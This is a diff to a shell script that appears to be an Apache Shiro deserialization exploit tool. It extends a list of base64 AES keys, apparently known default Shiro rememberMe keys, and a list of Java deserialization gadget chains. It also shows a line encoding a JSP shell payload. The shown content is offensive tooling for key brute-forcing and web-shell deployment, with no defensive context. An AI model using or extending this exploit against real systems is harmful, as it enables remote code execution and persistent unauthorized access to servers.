@@ -47,9 +47,31 @@ KEYS=(
   "0AvVhmFLUs0KTA3Kprsdag=="
   "1QWLxg+NYmxraMoxAXu/Iw=="
   "ZnJhbWUxLjYuMA=="
+  "L7RioUULEFhRyxM7a2R/Yg=="
+  "r0e3c16IdVkouZgk1TKVMg=="
+  "bWluZS1hc3NldC1rZXk6QQ=="
+  "6ZmI6I2j5Y+R5aSn5ZOlAA=="
+  "5aaC5qKm5oqA5pyvAAAAAA=="
+  "bWicP0XBL7iLRfMSYSSZnQ=="
+  "WcfHGU25gNnTxTlmJMeSpw=="
+  "ClLk69oNcA3m+s0jIMIkpg=="
+  "Is9zJ3pzNh2cgTHB4ua3+Q=="
+  "U3ByaW5nQmxhZGUAAAAAAA=="
+  "R29vZCBsdWNrISEhISEhISE="
+  "NsZXjXVklWPZwOfkvk6kUA=="
+  "GAevYnznvgNCURavBhCr1w=="
+  "aU1pcmFjbGVpTWlyYWNsZQ=="
+  "ZUdsaGJFshHKlBDbLRvSTw=="
+  "SDKOLKn2J1j/2BHjeZwAoQ=="
+  "tiVV6g3uZBGfhUGUzwIImQ=="
+  "cmVtZW1iZXJNZQAAAAAAAA=="
+  "66v1O8keKNV3TTcGPK1wzg=="
+  "bXRvbnMAAAAAAAAAAAAAAA=="
+  "a2VlcE9uR29pbmdBbmRGaQ=="
+  "Bf7MfkNR0axGGpZDB1bABw=="
 )
 
-GADGETS=("CommonsBeanutils1" "CommonsCollections2" "CommonsCollections6")
+GADGETS=("CommonsBeanutils1" "CommonsCollections2" "CommonsCollections1" "CommonsCollections6" "CommonsCollections3" "CommonsCollections4")
 
 SHELL_B64=$(printf '%s' "$SHELL_JSP" | base64 -w0)
 
